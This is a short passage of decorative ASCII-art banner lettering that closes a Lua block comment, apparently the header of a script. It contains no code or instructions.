				 | ' </ _ \ |  _/ _` (_-<  _| '_/ _ \ '_ \ ' \/ -_)
				 |_|\_\___/_|\__\__,_/__/\__|_| \___/ .__/_||_\___|
				                                    |_|           
	 ______  ______  ______  __      ______  ______  ______  ______ __  ______    
	/\  ___\/\  ___\/\  ___\/\ \    /\  ___\/\  == \/\  __ \/\__  _/\ \/\  ___\   
	\ \___  \ \ \___\ \  __\\ \ \___\ \  __\\ \  __<\ \  __ \/_/\ \\ \ \ \___  \  
	 \/\_____\ \_____\ \_____\ \_____\ \_____\ \_\ \_\ \_\ \_\ \ \_\\ \_\/\_____\ 
	  \/_____/\/_____/\/_____/\/_____/\/_____/\/_/ /_/\/_/\/_/  \/_/ \/_/\/_____/ 
--]]
